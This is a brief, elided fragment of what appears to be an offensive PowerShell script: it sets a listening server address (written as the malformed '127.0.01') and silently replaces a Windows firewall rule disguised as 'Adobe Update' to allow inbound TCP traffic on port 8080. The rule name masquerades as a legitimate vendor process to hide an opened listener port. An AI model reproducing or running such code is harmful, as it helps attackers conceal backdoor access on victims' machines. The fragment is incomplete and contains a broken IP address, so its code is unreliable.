...
$Server = '127.0.01' #Listening IP. Change This.
...
netsh advfirewall firewall delete rule name="Adobe Update" | Out-Null
netsh advfirewall firewall add rule name="Adobe Update" dir=in action=allow protocol=TCP localport=8080 | Out-Null
